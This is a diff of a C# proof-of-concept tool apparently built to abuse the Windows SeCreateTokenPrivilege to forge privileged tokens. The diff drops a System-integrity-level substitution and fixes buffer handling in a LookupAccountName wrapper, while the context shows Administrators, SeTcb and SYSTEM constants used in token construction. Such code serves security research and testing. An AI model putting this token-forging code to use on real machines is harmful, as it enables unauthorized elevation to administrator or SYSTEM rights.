@@ -345,7 +345,7 @@ namespace SeCreateTokenPrivilegePoC
             string lpAccountName,
             IntPtr Sid,
             ref int cbSid,
-            string ReferencedDomainName,
+            StringBuilder ReferencedDomainName,
             ref int cchReferencedDomainName,
             out SID_NAME_USE peUse);
 
@@ -408,12 +408,6 @@ namespace SeCreateTokenPrivilegePoC
         const string SECURITY_WORLD_RID = "S-1-1-0";
         const string DOMAIN_ALIAS_RID_ADMINS = "S-1-5-32-544";
         const string DOMAIN_ALIAS_RID_USERS = "S-1-5-32-545";
-        const string UNTRUSTED_INTEGRITY_LEVEL = "S-1-16-0";
-        const string LOW_INTEGRITY_LEVEL = "S-1-16-4096";
-        const string MEDIUM_INTEGRITY_LEVEL = "S-1-16-8192";
-        const string MEDIUM_MANDATORY_INTEGRITY_LEVEL = "S-1-16-8448";
-        const string HIGH_INTEGRITY_LEVEL = "S-1-16-12288";
-        const string SYSTEM_INTEGRITY_LEVEL = "S-1-16-16384";
         const string SE_DEBUG_NAME = "SeDebugPrivilege";
         const string SE_TCB_NAME = "SeTcbPrivilege";
         const string SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege";
@@ -423,8 +417,6 @@ namespace SeCreateTokenPrivilegePoC
         const uint SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002;
         const uint SE_GROUP_OWNER = 0x00000008;
         const uint SE_GROUP_USE_FOR_DENY_ONLY = 0x00000010;
-        const uint SE_GROUP_INTEGRITY = 0x00000020;
-        const uint SE_GROUP_INTEGRITY_ENABLED = 0x00000040;
         static readonly LUID ANONYMOUS_LOGON_LUID = new LUID(0x3e6, 0);
         static readonly LUID SYSTEM_LUID = new LUID(0x3e7, 0);
 
@@ -526,14 +518,6 @@ namespace SeCreateTokenPrivilegePoC
                 return IntPtr.Zero;
             }
 
-            if (!ConvertStringSidToSid(SYSTEM_INTEGRITY_LEVEL, out IntPtr pSystemIntegrity))
-            {
-                error = Marshal.GetLastWin32Error();
-                Console.WriteLine("[-] Failed to get System Integrity Level SID.");
-                Console.WriteLine("    |-> {0}\n", GetWin32ErrorMessage(error, false));
-                return IntPtr.Zero;
-            }
-
             IntPtr hCurrentToken = WindowsIdentity.GetCurrent().Token;
             IntPtr pTokenGroups = GetInformationFromToken(
                 hCurrentToken,
@@ -586,16 +570,6 @@ namespace SeCreateTokenPrivilegePoC
                     sidAndAttributes.Attributes = SE_GROUP_ENABLED |
                         SE_GROUP_ENABLED_BY_DEFAULT |
                         SE_GROUP_OWNER;
-                }
-                else if (sid == UNTRUSTED_INTEGRITY_LEVEL ||
-                    sid == LOW_INTEGRITY_LEVEL ||
-                    sid == MEDIUM_INTEGRITY_LEVEL ||
-                    sid == MEDIUM_MANDATORY_INTEGRITY_LEVEL ||
-                    sid == HIGH_INTEGRITY_LEVEL)
-                {
-                    sidAndAttributes.Sid = pSystemIntegrity;
-                    sidAndAttributes.Attributes = SE_GROUP_INTEGRITY |
-                        SE_GROUP_INTEGRITY_ENABLED;
                 }
                 else
                 {
@@ -714,24 +688,28 @@ namespace SeCreateTokenPrivilegePoC
 
         static bool GetCurrentUserSid(out IntPtr pSid)
         {
-            string currentUser = Environment.UserName;
-            string currentDomain = Environment.UserDomainName;
+            string currentUser = string.Format(
+                "{0}\\{1}",
+                Environment.UserDomainName,
+                Environment.UserName);
             int cbSid = Marshal.SizeOf(typeof(SID));
-            int cchReferencedDomainName = currentDomain.Length;
+            StringBuilder referencedDomainName = new StringBuilder();
+            int cchReferencedDomainName = Environment.UserDomainName.Length;
             bool status;
             int error;
 
-            pSid = Marshal.AllocHGlobal(cbSid);
-            ZeroMemory(pSid, cbSid);
-
             do
             {
+                referencedDomainName.Capacity = cchReferencedDomainName;
+                pSid = Marshal.AllocHGlobal(cbSid);
+                ZeroMemory(pSid, cbSid);
+
                 status = LookupAccountName(
                     IntPtr.Zero,
                     currentUser,
                     pSid,
                     ref cbSid,
-                    currentDomain,
+                    referencedDomainName,
                     ref cchReferencedDomainName,
                     out SID_NAME_USE peUse);
                 error = Marshal.GetLastWin32Error();
@@ -746,9 +724,8 @@ namespace SeCreateTokenPrivilegePoC
                 }
                 else
                 {
+                    referencedDomainName.Clear();
                     Marshal.FreeHGlobal(pSid);
-                    pSid = Marshal.AllocHGlobal(cbSid);
-                    ZeroMemory(pSid, cbSid);
                 }
             } while (!status && error == ERROR_INSUFFICIENT_BUFFER);
 
